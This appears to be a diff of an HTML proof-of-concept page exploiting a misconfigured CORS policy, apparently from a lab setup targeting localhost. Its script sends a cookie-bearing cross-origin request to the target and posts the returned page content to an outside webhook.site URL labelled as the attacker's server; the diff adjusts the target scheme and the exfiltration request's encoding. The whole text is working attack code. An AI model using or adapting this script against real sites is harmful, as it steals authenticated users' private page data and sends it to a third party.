@@ -7,7 +7,7 @@
 		<script>
 			var crossoriginget = new XMLHttpRequest();
 			//The target site with the bad CORS configuration
-			var url = 'https://localhost';
+			var url = 'http://localhost';
 			crossoriginget.open('GET', url, true);
 			/*  This tells the browser to send the request with cookies;
 			    requires “Access-Control-Allow-Credentials = true” in
@@ -23,8 +23,8 @@
 				//Our server hosting the CORS attack
 				var maliciousurl = 'https://webhook.site/1867bd0a-9d81-47ef-a868-bbe3aa158e8c';
 				exfiltraterequest.open('POST', maliciousurl);
-				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded,text/html');
+				exfiltraterequest.send('responsehtml=' + String(this.responseText));
 			};
 		</script>
 	</body>
